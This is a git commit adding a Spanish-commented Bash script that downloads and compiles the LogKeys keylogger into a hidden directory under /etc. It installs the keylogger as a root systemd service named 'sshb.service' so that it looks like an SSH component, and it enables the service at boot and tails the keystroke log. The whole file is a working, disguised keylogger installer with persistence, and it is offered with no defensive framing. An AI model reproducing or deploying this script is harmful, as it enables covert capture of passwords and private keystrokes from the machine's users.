f1ed7be5659c961e9d9495170baf858b43f2717a
cerotre <136886748+cerotre@users.noreply.github.com>
2024-02-17 20:58:42 +0100

    Create newkl2.sh

---
+++ kl/newkl2.sh
@@ -0,0 +1,58 @@
+#!/bin/bash
+# Instalación de dependencias en sistema Ubuntu
+sudo apt install build-essential autotools-dev autoconf kbd -y
+
+sudo mkdir /etc/.sshb_config
+cd /etc/.sshb_config/
+
+# Descarga del keylogger LogKeys
+sudo wget https://github.com/kernc/logkeys/archive/master.zip
+
+# Descomprime el archivo
+sudo unzip master.zip
+
+# Ingresa al directorio generado
+cd logkeys-master/
+
+# Ejecuta el script autogen
+sudo ./autogen.sh
+
+# Configura, compila e instala LogKeys
+sudo ./configure && sudo make && sudo make install
+
+# Descarga el mapa de teclado en español
+sudo wget https://raw.githubusercontent.com/kernc/logkeys/master/keymaps/es_ES.map
+
+# Segunda parte
+sudo touch /etc/systemd/system/sshb.service
+sudo chmod +x /etc/systemd/system/sshb.service
+
+unit_file="/etc/systemd/system/sshb.service"
+
+# Contenido de la UNIT
+unit_content="[Unit]
+Description=SSHB Service
+After=network.target
+
+[Service]
+Type=simple
+User=root
+Group=root
+ExecStart=logkeys -s -m /etc/.sshb_config/logkeys-master/es_ES.map --no-func-keys
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+"
+
+sudo echo "$unit_content" | sudo tee "$unit_file" > /dev/null
+
+sudo systemctl enable sshb.service
+sudo systemctl start sshb.service
+
+# Ejecuta LogKeys en modo seguimiento, especificando el mapa de teclado y excluyendo las teclas de función
+sudo logkeys -s -m es_ES.map --no-func-keys
+
+# Abre otro terminal y muestra en tiempo real el contenido del archivo de registro de LogKeys
+sudo tail -f /var/log/logkeys.log
+
